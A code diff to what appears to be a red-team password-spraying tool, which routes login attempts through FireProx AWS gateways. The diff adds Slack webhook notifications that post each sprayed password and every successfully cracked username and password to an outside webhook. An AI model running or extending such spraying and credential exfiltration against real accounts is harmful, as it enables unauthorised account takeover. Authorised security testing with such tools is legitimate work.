@@ -3,6 +3,7 @@
 import threading, queue, argparse, datetime, json, importlib, random, os, time
 from fire import FireProx
 import utils.utils as utils
+import utils.notify as notify
 
 credentials = { 'accounts':[] }
 regions = [
@@ -24,11 +25,14 @@ time_lapse = None
 results = []
 cancelled = False
 
+notify_obj = {}
+
 def main(args,pargs):
 
-	global start_time, end_time, time_lapse, outfile, cancelled, color
+	global start_time, end_time, time_lapse, outfile, cancelled, color, notify_obj
 
 	# assign variables
+	# TOO MANY MF VARIABLES THIS HAS GOTTEN OUT OF CONTROL
 	thread_count = args.threads
 	plugin = args.plugin
 	username_file = args.userfile
@@ -48,7 +52,10 @@ def main(args,pargs):
 	headers = args.header
 	weekdaywarrior = args.weekday_warrior
 	color = args.color
-
+	notify_obj = {
+		"type" : args.notify,
+		"webhook" : args.webhook
+	}
 
 	# input exception handling
 	if outfile != None:
@@ -86,6 +93,17 @@ def main(args,pargs):
 		return
 	elif jitter_min is not None and jitter is not None and jitter_min >= jitter:
 		log_entry("--jitter flag must be greater than --jitter-min flag")
+		return
+
+	# Notify options
+	if notify_obj['type'] is not None and notify_obj['webhook'] is None:
+		log_entry("--notify flag must have corresponding --webhook flag entry")
+		return
+	elif notify_obj['type'] is not None and notify_obj['type'].lower() not in ["slack"]:
+		log_entry("--notify flag must be of type {type}".format(type=["slack"]))
+		return
+	elif notify_obj['type'] is None and notify_obj['webhook'] is not None:
+		log_entry("--webhook flag must have corresponding --notify flag entry")
 		return
 
 	# Weekday Warrior options
@@ -162,12 +180,15 @@ def main(args,pargs):
 		for password in passwords:
 
 			time_count += 1
+			if notify_obj['type'] is not None:
+				if time_count == 1:
+					if userenum:
+						notify.notify_update("Info: Starting Userenum.", notify_obj)
+					else:
+						notify.notify_update("Info: Starting Spray.\nPass: " + password, notify_obj)
 
-			#TODO: if webhook is true:
-			# if time_count == 1:
-			# 	utils.slacklog("Info: Spray Starting.\nPass: " + password)
-			# else:
-			# 	utils.slacklog("Info: Spray Continuing.\nPass: " + password)
+				else:
+					notify.notify_update("Info: Spray Continuing.\nPass: " + password, notify_obj)
 
 			if weekdaywarrior is not None:
 				spray_days = {
@@ -374,7 +395,7 @@ def clear_all_apis(access_key, secret_access_key, profile_name, session_token):
 
 def spray_thread(api_key, api_dict, plugin, pluginargs, jitter=None, jitter_min=None):
 
-	global results, color
+	global results, color, notify_obj
 
 	try:
 		plugin_authentiate = getattr(importlib.import_module('plugins.{}.{}'.format(plugin, plugin)), '{}_authenticate'.format(plugin))
@@ -408,6 +429,10 @@ def spray_thread(api_key, api_dict, plugin, pluginargs, jitter=None, jitter_min=
 
 			if response['result'].lower() == "success" and ('userenum' not in pluginargs):
 				results.append( {'username' : cred['username'], 'password' : cred['password']} )
+
+				if notify_obj['type'] is not None:
+					notify.notify_success(cred['username'], cred['password'], notify_obj)
+
 
 			if color:
 
@@ -576,6 +601,10 @@ if __name__ == '__main__':
 	adv_args.add_argument('--header', default=None, required=False, help='Add a custom header to each request for attribution, specify "X-Header: value"')
 	adv_args.add_argument('--weekday-warrior', default=None, required=False, help="If you don't know what this is don't use it, input is timezone UTC offset")
 	adv_args.add_argument('--color', default=False, action="store_true", required=False, help="Output spray results in Green/Yellow/Red colors")
+
+	notify_args = parser.add_argument_group(title='Notification Inputs')
+	notify_args.add_argument('--notify', type=str, default=None, help='Type of backend notification system {slack}')
+	notify_args.add_argument('--webhook', type=str, default=None, help='Webhook link for applicable service')
 
 	fp_args = parser.add_argument_group(title='Fireprox Connection Inputs')
 	fp_args.add_argument('--profile_name', type=str, default=None, help='AWS Profile Name to store/retrieve credentials')
